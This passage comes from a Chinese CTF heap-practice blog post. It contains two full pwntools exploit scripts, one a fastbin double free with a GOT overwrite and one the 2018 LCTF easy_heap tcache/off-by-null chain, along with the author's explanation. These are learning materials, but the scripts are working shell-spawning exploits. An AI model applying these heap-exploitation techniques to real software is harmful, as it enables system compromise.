operator">+</span>r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span>r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span>libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span><span class="token string">"set $libc_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>    break_point<span class="token operator">+=</span><span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice : "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Length of the name :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The name of this life :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The level of this life (High/Low) :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice : "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"remove: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice : "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>life_list <span class="token operator">=</span> <span class="token number">0x0000000006020E0</span>life_count <span class="token operator">=</span> <span class="token number">0x0000000006020CC</span>malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>life_list<span class="token number">-0x56</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>malloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">30</span> <span class="token operator">+</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#3</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>_IO_2_1_stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>get_libc<span class="token punctuation">(</span>_IO_2_1_stdout_addr<span class="token punctuation">,</span><span class="token string">"_IO_2_1_stdout_"</span><span class="token punctuation">)</span>one_gad_get <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x45216</span>malloc_hook_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"__free_hook"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>one_gad_get<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#6</span>malloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#7</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x602018</span><span class="token operator">-</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xe</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#8</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>free<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>但是利用过程我就很懵逼了，我最开始把one_gadget写入了malloc_hook，但是一直没办法getshell，strace追踪调试发现新开的shell莫名其妙自己退出了，咱也不知道啥原因，gdb调试也显示了new program /bin/sh ，哎，可能触及知识盲区了，然后看wp呗，卧槽，他们跟我一样啊，为啥我的不行，呜呜呜，然后我突然想起来程序的保护没有完全开启。</p><pre><code>\[*] &#39;/home/root0/pratice/2020_heap_practice/ctf-save/pwn1&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>那么我就可以写到got表里了，果然，成功getshell，嗯，要学会动脑子！！！</p><h3 id="2018LCTF-easy-heap"><a href="#2018LCTF-easy-heap" class="headerlink" title="2018LCTF easy_heap"></a>2018LCTF easy_heap</h3><img src="/2020/01/30/2020-heap-practice/image-20200120150838173.png" title="This is an image"><p>这个题目没有edit功能，这就会使得利用稍微变的难一点，同时对于分配堆块的add函数<br><img src="/2020/01/30/2020-heap-practice/image-20200120150949691.png" title="This is an image"></p><p>我们可以看到，这程序起始时calloc分配的堆块中，存储的类似于一个结构体指针</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> ptr<span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token operator">*</span> ptr_array<span class="token punctuation">;</span>    size <span class="token operator">=</span> <span class="token operator">*</span> <span class="token punctuation">(</span>ptr_array <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>同时堆块读入操作中明显存在off-by-NULL漏洞。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_BEC</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-14h] [rbp-14h]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> v3 <span class="token operator">||</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">||</span> ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token operator">++</span>v3<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ptr<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>但是这个题目堆块分配的大小起始不是我们可以控制的，都是程序直接分配出一个0x100大小的堆块来让你用，而且没有堆溢出，这使得利用稍微麻烦一点。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>首先就是排列堆块结构，我们没办法用自己的操作来实现利用，就要依赖于系统内部对于堆块的操作来达到我们想要的目的。<br>    1.题目中我们只能申请10个堆块，由于tcache的存在，我们肯定7个都要用来消耗tcache,这样我们就可以释放unsorted bin来帮助地址泄露，但是unsorted bin attack的时候一般都会多申请一个chunk来实现防止top chunk的合并，但是我们肯定不能这样，因为就10个堆块，没得堆块可以浪费，那么我们就可以把一个free的tcache与top chunk相邻，因为tcache和fastbin一样，不会轻易与top chunk合并.<br>    2.我们知道存在off-by-null，所以我们要想办法利用，我们可以利用unsorted bin在释放后不会将pre_size清0的特点来实现unlink进而实现堆块重叠，但是要注意tcache的影响<br>    3.堆块重叠后我们先用unsorted bin attack泄露出地址，然后利用tcache的double free来实现任意地址写，进而getshell<br>这中间过程还是挺复杂的，细节写在exp里面了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcherexec_binary <span class="token operator">=</span> <span class="token string">"./easy_heap"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.27'</span>local <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binarycontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>                                                         libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>                                                         libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span> libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd <span class="token operator">+</span> r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span> libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span> <span class="token operator">+</span> \        str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">"set $libc_base="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    break_point <span class="token operator">+=</span> <span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span> break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" ==> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 0 - 6 --> tcache</span>    malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 7 - 9 ---> unsorted bin</span>    malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 把一个tcache块放到最后防止topchunk合并</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 所有的tcache都申请出来</span>    malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 之前的unsorted bin 也申请出来</span>    malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># tcache 链表里面存入6个</span>    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># unsorted bin 的第二个放入tcache，同时它也在链表的最外面</span>free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 用来unlink，同时伪造好了fd和bk,简直完美</span>malloc<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># off-by-NULL使得第9号chunk的pre_inuse位被置0 idx = 0</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 填满tcache链表方便unsorted bin 操作</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 利用之前unsorted bin操作留下的pre_size合并出一个大的堆块</span><span class="token comment" spellcheck="true"># 这时候我们可以知道已经出现堆块交叉，这接下来就很简单了</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 消耗tcache</span>    malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 申请出一个unsorted bin的堆块方便泄露libc ,idx = 8</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 从这里可以看出unsorted bin 的堆块切分操作会把相关bin的地址再次写入到最外面的unsorted bin堆块。</span>libcbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3afca0</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> libcbaseconfirm<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>malloc_hook_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> libcbaseconfirm<span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token number">0x41612</span> <span class="token operator">+</span> libcbaseconfirm<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># idx = 9 ,但是和idx = 0的堆块出现重合，因此两个指针同时指向了一个堆块</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># tcache double free</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>malloc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>malloc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token 